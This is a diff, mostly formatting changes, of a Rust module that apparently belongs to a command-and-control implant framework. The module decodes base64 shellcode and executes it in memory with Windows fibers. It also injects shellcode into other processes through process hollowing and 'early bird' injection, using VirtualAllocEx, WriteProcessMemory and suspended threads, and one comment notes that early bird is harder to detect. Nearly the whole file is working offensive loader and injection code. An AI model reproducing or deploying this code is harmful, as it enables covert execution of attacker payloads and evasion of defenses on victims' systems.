@@ -1,24 +1,23 @@
+use base64::{engine::general_purpose, Engine as _};
 #[cfg(target_os = "windows")]
 use nexus_common::*;
 use std::ffi::c_void;
-use std::ptr::{null, null_mut};
 use std::mem;
-use base64::{Engine as _, engine::general_purpose};
+use std::ptr::{null, null_mut};
 
 #[cfg(target_os = "windows")]
 use windows_sys::Win32::{
-    Foundation::{GetLastError, CloseHandle, FALSE},
-    System::Threading::{
-        ConvertThreadToFiber, CreateFiber, SwitchToFiber, DeleteFiber,
-        ConvertFiberToThread, LPFIBER_START_ROUTINE,
-        CreateProcessA, PROCESS_INFORMATION, STARTUPINFOA,
-        ResumeThread, SuspendThread, DETACHED_PROCESS
-    },
-    System::Memory::{
-        VirtualAlloc, VirtualProtect, VirtualAllocEx, VirtualProtectEx,
-        MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READ
-    },
+    Foundation::{CloseHandle, GetLastError, FALSE},
     System::Diagnostics::Debug::WriteProcessMemory,
+    System::Memory::{
+        VirtualAlloc, VirtualAllocEx, VirtualProtect, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE,
+        PAGE_EXECUTE_READ, PAGE_READWRITE,
+    },
+    System::Threading::{
+        ConvertFiberToThread, ConvertThreadToFiber, CreateFiber, CreateProcessA, DeleteFiber,
+        ResumeThread, SuspendThread, SwitchToFiber, DETACHED_PROCESS, LPFIBER_START_ROUTINE,
+        PROCESS_INFORMATION, STARTUPINFOA,
+    },
 };
 
 // Fiber execution engine for Windows
@@ -47,31 +46,38 @@ impl FiberExecutor {
             .map_err(|e| NexusError::TaskExecutionError(format!("Base64 decode error: {}", e)))?;
 
         if shellcode.is_empty() {
-            return Err(NexusError::TaskExecutionError("Empty shellcode".to_string()));
+            return Err(NexusError::TaskExecutionError(
+                "Empty shellcode".to_string(),
+            ));
         }
 
-        if shellcode.len() > 50 * 1024 * 1024 {  // 50MB limit
-            return Err(NexusError::TaskExecutionError("Shellcode too large".to_string()));
+        if shellcode.len() > 50 * 1024 * 1024 {
+            // 50MB limit
+            return Err(NexusError::TaskExecutionError(
+                "Shellcode too large".to_string(),
+            ));
         }
 
-        unsafe {
-            self.execute_shellcode_with_fiber(&shellcode)
-        }
+        unsafe { self.execute_shellcode_with_fiber(&shellcode) }
     }
 
     /// Execute shellcode using process hollowing with fibers
-    pub async fn execute_fiber_hollowing(&self, shellcode_b64: &str, target_process: &str) -> Result<String> {
+    pub async fn execute_fiber_hollowing(
+        &self,
+        shellcode_b64: &str,
+        target_process: &str,
+    ) -> Result<String> {
         let shellcode = general_purpose::STANDARD
             .decode(shellcode_b64)
             .map_err(|e| NexusError::TaskExecutionError(format!("Base64 decode error: {}", e)))?;
 
         if shellcode.is_empty() {
-            return Err(NexusError::TaskExecutionError("Empty shellcode".to_string()));
+            return Err(NexusError::TaskExecutionError(
+                "Empty shellcode".to_string(),
+            ));
         }
 
-        unsafe {
-            self.execute_via_process_hollowing(&shellcode, target_process)
-        }
+        unsafe { self.execute_via_process_hollowing(&shellcode, target_process) }
     }
 
     unsafe fn execute_shellcode_with_fiber(&self, shellcode: &[u8]) -> Result<String> {
@@ -84,7 +90,9 @@ impl FiberExecutor {
         );
 
         if buffer.is_null() {
-            return Err(NexusError::TaskExecutionError("Failed to allocate memory".to_string()));
+            return Err(NexusError::TaskExecutionError(
+                "Failed to allocate memory".to_string(),
+            ));
         }
 
         // Copy shellcode to allocated memory
@@ -93,7 +101,9 @@ impl FiberExecutor {
         // Change memory protection to executable
         let mut old_protect = 0u32;
         if VirtualProtect(buffer, shellcode.len(), PAGE_EXECUTE_READ, &mut old_protect) == 0 {
-            return Err(NexusError::TaskExecutionError("Failed to change memory protection".to_string()));
+            return Err(NexusError::TaskExecutionError(
+                "Failed to change memory protection".to_string(),
+            ));
         }
 
         // Execute using fibers
@@ -113,10 +123,12 @@ impl FiberExecutor {
         let main_fiber = ConvertThreadToFiber(null());
         if main_fiber.is_null() {
             let error = GetLastError();
-            if error != 0x00000578 {  // ERROR_ALREADY_FIBER
-                return Err(NexusError::TaskExecutionError(
-                    format!("ConvertThreadToFiber failed: {}", error)
-                ));
+            if error != 0x00000578 {
+                // ERROR_ALREADY_FIBER
+                return Err(NexusError::TaskExecutionError(format!(
+                    "ConvertThreadToFiber failed: {}",
+                    error
+                )));
             }
         }
 
@@ -129,9 +141,10 @@ impl FiberExecutor {
 
         if shellcode_fiber.is_null() {
             ConvertFiberToThread();
-            return Err(NexusError::TaskExecutionError(
-                format!("CreateFiber failed: {}", GetLastError())
-            ));
+            return Err(NexusError::TaskExecutionError(format!(
+                "CreateFiber failed: {}",
+                GetLastError()
+            )));
         }
 
         // Execute the fiber
@@ -149,15 +162,22 @@ impl FiberExecutor {
 
         match result {
             Ok(_) => Ok(()),
-            Err(_) => Err(NexusError::TaskExecutionError("Fiber execution failed".to_string())),
+            Err(_) => Err(NexusError::TaskExecutionError(
+                "Fiber execution failed".to_string(),
+            )),
         }
     }
 
-    unsafe fn execute_via_process_hollowing(&self, shellcode: &[u8], target_process: &str) -> Result<String> {
+    unsafe fn execute_via_process_hollowing(
+        &self,
+        shellcode: &[u8],
+        target_process: &str,
+    ) -> Result<String> {
         use std::ffi::CString;
 
-        let target_path = CString::new(target_process)
-            .map_err(|e| NexusError::TaskExecutionError(format!("Invalid target process path: {}", e)))?;
+        let target_path = CString::new(target_process).map_err(|e| {
+            NexusError::TaskExecutionError(format!("Invalid target process path: {}", e))
+        })?;
 
         let mut startup_info: STARTUPINFOA = mem::zeroed();
         let mut process_info: PROCESS_INFORMATION = mem::zeroed();
@@ -178,9 +198,10 @@ impl FiberExecutor {
         );
 
         if result == 0 {
-            return Err(NexusError::TaskExecutionError(
-                format!("Failed to create target process: {}", GetLastError())
-            ));
+            return Err(NexusError::TaskExecutionError(format!(
+                "Failed to create target process: {}",
+                GetLastError()
+            )));
         }
 
         // Suspend the main thread
@@ -188,9 +209,10 @@ impl FiberExecutor {
             let error = GetLastError();
             CloseHandle(process_info.hProcess);
             CloseHandle(process_info.hThread);
-            return Err(NexusError::TaskExecutionError(
-                format!("Failed to suspend thread: {}", error)
-            ));
+            return Err(NexusError::TaskExecutionError(format!(
+                "Failed to suspend thread: {}",
+                error
+            )));
         }
 
         // Allocate memory in target process
@@ -206,9 +228,10 @@ impl FiberExecutor {
             let error = GetLastError();
             CloseHandle(process_info.hProcess);
             CloseHandle(process_info.hThread);
-            return Err(NexusError::TaskExecutionError(
-                format!("Failed to allocate memory in target: {}", error)
-            ));
+            return Err(NexusError::TaskExecutionError(format!(
+                "Failed to allocate memory in target: {}",
+                error
+            )));
         }
 
         // Create fiber initialization shellcode stub
@@ -228,9 +251,10 @@ impl FiberExecutor {
             let error = GetLastError();
             CloseHandle(process_info.hProcess);
             CloseHandle(process_info.hThread);
-            return Err(NexusError::TaskExecutionError(
-                format!("Failed to write to target process: {}", error)
-            ));
+            return Err(NexusError::TaskExecutionError(format!(
+                "Failed to write to target process: {}",
+                error
+            )));
         }
 
         // Change memory protection to executable
@@ -241,13 +265,15 @@ impl FiberExecutor {
             fiber_stub.len(),
             PAGE_EXECUTE_READ,
             &mut old_protect,
-        ) == 0 {
+        ) == 0
+        {
             let error = GetLastError();
             CloseHandle(process_info.hProcess);
             CloseHandle(process_info.hThread);
-            return Err(NexusError::TaskExecutionError(
-                format!("Failed to change memory protection in target: {}", error)
-            ));
+            return Err(NexusError::TaskExecutionError(format!(
+                "Failed to change memory protection in target: {}",
+                error
+            )));
         }
 
         // Resume thread to execute our fiber code
@@ -255,9 +281,10 @@ impl FiberExecutor {
             let error = GetLastError();
             CloseHandle(process_info.hProcess);
             CloseHandle(process_info.hThread);
-            return Err(NexusError::TaskExecutionError(
-                format!("Failed to resume thread: {}", error)
-            ));
+            return Err(NexusError::TaskExecutionError(format!(
+                "Failed to resume thread: {}",
+                error
+            )));
         }
 
         // Cleanup handles
@@ -271,26 +298,25 @@ impl FiberExecutor {
         // Create a minimal fiber initialization stub
         // This is a simplified version - in production, this would be more sophisticated
         let mut stub = Vec::new();
-        
+
         // Simple x64 shellcode that:
         // 1. Converts thread to fiber
         // 2. Creates fiber for our shellcode
         // 3. Switches to our fiber
         let fiber_init: &[u8] = &[
             // Save registers
-            0x48, 0x83, 0xEC, 0x28,                  // sub rsp, 28h (align stack + shadow space)
-            
+            0x48, 0x83, 0xEC, 0x28, // sub rsp, 28h (align stack + shadow space)
             // ConvertThreadToFiber(NULL)
-            0x48, 0x31, 0xC9,                        // xor rcx, rcx
+            0x48, 0x31, 0xC9, // xor rcx, rcx
             // Note: In a real implementation, we'd need to dynamically resolve the API address
             // For now, this is a placeholder that would need API resolution
-            
+
             // Add a simple infinite loop to prevent crashes during development
-            0xEB, 0xFE,                              // jmp $ (infinite loop)
+            0xEB, 0xFE, // jmp $ (infinite loop)
         ];
 
         stub.extend_from_slice(fiber_init);
-        
+
         // Append the actual shellcode after a small offset
         stub.resize(512, 0x90); // NOP padding
         stub.extend_from_slice(shellcode);
@@ -299,24 +325,31 @@ impl FiberExecutor {
     }
 
     /// Execute shellcode with early bird injection technique using fibers
-    pub async fn execute_early_bird_fiber(&self, shellcode_b64: &str, target_process: &str) -> Result<String> {
+    pub async fn execute_early_bird_fiber(
+        &self,
+        shellcode_b64: &str,
+        target_process: &str,
+    ) -> Result<String> {
         let shellcode = general_purpose::STANDARD
             .decode(shellcode_b64)
             .map_err(|e| NexusError::TaskExecutionError(format!("Base64 decode error: {}", e)))?;
 
-        unsafe {
-            self.execute_early_bird_injection(&shellcode, target_process)
-        }
+        unsafe { self.execute_early_bird_injection(&shellcode, target_process) }
     }
 
-    unsafe fn execute_early_bird_injection(&self, shellcode: &[u8], target_process: &str) -> Result<String> {
+    unsafe fn execute_early_bird_injection(
+        &self,
+        shellcode: &[u8],
+        target_process: &str,
+    ) -> Result<String> {
         // Early bird injection creates a process in suspended state,
         // injects code before the main thread starts, then resumes execution
         // This technique is harder to detect since injection happens before process initialization
 
         use std::ffi::CString;
-        let target_path = CString::new(target_process)
-            .map_err(|e| NexusError::TaskExecutionError(format!("Invalid target process path: {}", e)))?;
+        let target_path = CString::new(target_process).map_err(|e| {
+            NexusError::TaskExecutionError(format!("Invalid target process path: {}", e))
+        })?;
 
         let mut startup_info: STARTUPINFOA = mem::zeroed();
         let mut process_info: PROCESS_INFORMATION = mem::zeroed();
@@ -337,9 +370,10 @@ impl FiberExecutor {
         );
 
         if result == 0 {
-            return Err(NexusError::TaskExecutionError(
-                format!("Failed to create suspended process: {}", GetLastError())
-            ));
+            return Err(NexusError::TaskExecutionError(format!(
+                "Failed to create suspended process: {}",
+                GetLastError()
+            )));
         }
 
         // Allocate and inject shellcode before process starts
@@ -355,9 +389,10 @@ impl FiberExecutor {
             let error = GetLastError();
             CloseHandle(process_info.hProcess);
             CloseHandle(process_info.hThread);
-            return Err(NexusError::TaskExecutionError(
-                format!("VirtualAllocEx failed: {}", error)
-            ));
+            return Err(NexusError::TaskExecutionError(format!(
+                "VirtualAllocEx failed: {}",
+                error
+            )));
         }
 
         let mut bytes_written = 0;
@@ -373,9 +408,10 @@ impl FiberExecutor {
             let error = GetLastError();
             CloseHandle(process_info.hProcess);
             CloseHandle(process_info.hThread);
-            return Err(NexusError::TaskExecutionError(
-                format!("WriteProcessMemory failed: {}", error)
-            ));
+            return Err(NexusError::TaskExecutionError(format!(
+                "WriteProcessMemory failed: {}",
+                error
+            )));
         }
 
         let mut old_protect = 0u32;
@@ -385,13 +421,15 @@ impl FiberExecutor {
             shellcode.len(),
             PAGE_EXECUTE_READ,
             &mut old_protect,
-        ) == 0 {
+        ) == 0
+        {
             let error = GetLastError();
             CloseHandle(process_info.hProcess);
             CloseHandle(process_info.hThread);
-            return Err(NexusError::TaskExecutionError(
-                format!("VirtualProtectEx failed: {}", error)
-            ));
+            return Err(NexusError::TaskExecutionError(format!(
+                "VirtualProtectEx failed: {}",
+                error
+            )));
         }
 
         // Resume the process - our code will execute as part of process initialization
@@ -399,9 +437,10 @@ impl FiberExecutor {
             let error = GetLastError();
             CloseHandle(process_info.hProcess);
             CloseHandle(process_info.hThread);
-            return Err(NexusError::TaskExecutionError(
-                format!("ResumeThread failed: {}", error)
-            ));
+            return Err(NexusError::TaskExecutionError(format!(
+                "ResumeThread failed: {}",
+                error
+            )));
         }
 
         CloseHandle(process_info.hProcess);
@@ -413,16 +452,23 @@ impl FiberExecutor {
     /// Validate shellcode format and basic safety checks
     fn validate_shellcode(&self, shellcode: &[u8]) -> Result<()> {
         if shellcode.is_empty() {
-            return Err(NexusError::TaskExecutionError("Empty shellcode".to_string()));
+            return Err(NexusError::TaskExecutionError(
+                "Empty shellcode".to_string(),
+            ));
         }
 
-        if shellcode.len() > 100 * 1024 * 1024 { // 100MB limit
-            return Err(NexusError::TaskExecutionError("Shellcode exceeds size limit".to_string()));
+        if shellcode.len() > 100 * 1024 * 1024 {
+            // 100MB limit
+            return Err(NexusError::TaskExecutionError(
+                "Shellcode exceeds size limit".to_string(),
+            ));
         }
 
         // Basic shellcode validation (check for obvious nulls, etc.)
         if shellcode.len() < 4 {
-            return Err(NexusError::TaskExecutionError("Shellcode too small".to_string()));
+            return Err(NexusError::TaskExecutionError(
+                "Shellcode too small".to_string(),
+            ));
         }
 
         Ok(())
@@ -445,19 +491,27 @@ impl FiberExecutor {
 
     pub async fn execute_direct_fiber(&self, _shellcode_b64: &str) -> Result<String> {
         Err(NexusError::TaskExecutionError(
-            "Fiber execution not supported on this platform".to_string()
+            "Fiber execution not supported on this platform".to_string(),
         ))
     }
 
-    pub async fn execute_fiber_hollowing(&self, _shellcode_b64: &str, _target_process: &str) -> Result<String> {
+    pub async fn execute_fiber_hollowing(
+        &self,
+        _shellcode_b64: &str,
+        _target_process: &str,
+    ) -> Result<String> {
         Err(NexusError::TaskExecutionError(
-            "Fiber hollowing not supported on this platform".to_string()
+            "Fiber hollowing not supported on this platform".to_string(),
         ))
     }
 
-    pub async fn execute_early_bird_fiber(&self, _shellcode_b64: &str, _target_process: &str) -> Result<String> {
+    pub async fn execute_early_bird_fiber(
+        &self,
+        _shellcode_b64: &str,
+        _target_process: &str,
+    ) -> Result<String> {
         Err(NexusError::TaskExecutionError(
-            "Early bird injection not supported on this platform".to_string()
+            "Early bird injection not supported on this platform".to_string(),
         ))
     }
 }
@@ -477,11 +531,11 @@ mod tests {
     #[tokio::test]
     async fn test_invalid_shellcode() {
         let executor = FiberExecutor::new();
-        
+
         // Test empty shellcode
         let result = executor.execute_direct_fiber("").await;
         assert!(result.is_err());
-        
+
         // Test invalid base64
         let result = executor.execute_direct_fiber("invalid_base64!").await;
         assert!(result.is_err());
@@ -491,7 +545,7 @@ mod tests {
     #[tokio::test]
     async fn test_non_windows_fallback() {
         let executor = FiberExecutor::new();
-        
+
         let result = executor.execute_direct_fiber("dGVzdA==").await; // "test" in base64
         assert!(result.is_err());
         assert!(result.unwrap_err().to_string().contains("not supported"));
